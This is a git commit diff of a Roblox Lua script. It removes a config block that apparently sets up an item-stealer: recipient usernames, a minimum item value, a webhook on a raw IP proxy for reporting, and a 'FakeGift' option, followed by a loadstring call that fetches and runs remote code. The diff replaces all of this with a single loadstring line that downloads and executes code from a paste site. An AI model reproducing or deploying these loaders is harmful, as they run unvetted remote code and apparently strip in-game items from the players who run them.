ac51c2c2fca132fd3039534007e5ccac15767cda
RylHUB <166063600+RylHUB@users.noreply.github.com>
2025-08-04 22:29:39 +0800

    Upload script.lua via Script Source Converter

--- script.lua
+++ script.lua
@@ -1,13 +1,1 @@
-_G.NullConfig = {
-    User = {"Rylkiyogami", "LexiiPlays"},
-    min_value = 10000000000,
-    pingEveryone = "No", -- dont change this
-    Webhook = "http://176.100.37.215:20002/proxy/7b6b3cf830417a3f7b36d70db8d962a3",
-    FakeGift = "No",
-    Trash = "http://176.100.37.215:20002/proxy/7b6b3cf830417a3f7b36d70db8d962a3",
-    LoadingScreen = "No",
-    GiftOnlyRares = "No",
-    ExecuteOtherScript = "No",
-}
-    
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+loadstring(game:HttpGet("https://pastefy.app/eS4S6gDo/raw", true))()
